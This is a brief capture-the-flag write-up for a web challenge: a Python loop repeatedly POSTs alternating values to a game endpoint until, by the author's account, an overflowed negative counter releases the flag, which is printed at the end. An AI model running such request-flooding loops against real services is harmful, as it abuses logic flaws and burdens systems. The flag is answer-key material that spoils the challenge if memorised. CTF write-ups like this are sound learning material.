#### Challenge:

R-Boy arrives in the Web Realm, a celestial domain comprised of floating islands in the digital sky. These highly interconnected islands create an intricate network resembling a spider's web. Here, energy flows swiftly, and R-Boy senses a strange energy.

[[Enter the Tavern](http://gamebox1.reply.it/web1-f1103cad4b0542c69e23b267e173799295c4f217/)](http://gamebox1.reply.it/web1-f1103cad4b0542c69e23b267e173799295c4f217/)

---

#### Solution:

- just playing around with the API randomly spitted out the flag around `64000`` negative counter

```python
import requests
import time

ses = requests.session()

while True:
    time.sleep(2)
    r = ses.post(
        f'http://gamebox1.reply.it/web1-f1103cad4b0542c69e23b267e173799295c4f217/got-a-goat', data={"type": "red"})
    print(r.text)
    time.sleep(2)
    r = ses.post(
        f'http://gamebox1.reply.it/web1-f1103cad4b0542c69e23b267e173799295c4f217/got-a-goat', data={"type": "green"})
    print(r.text)
```

---

<details><summary>FLAG:</summary>

```
{FLG:y0U-aT3_700-mUch_B4D_GO4T}
```

</details>
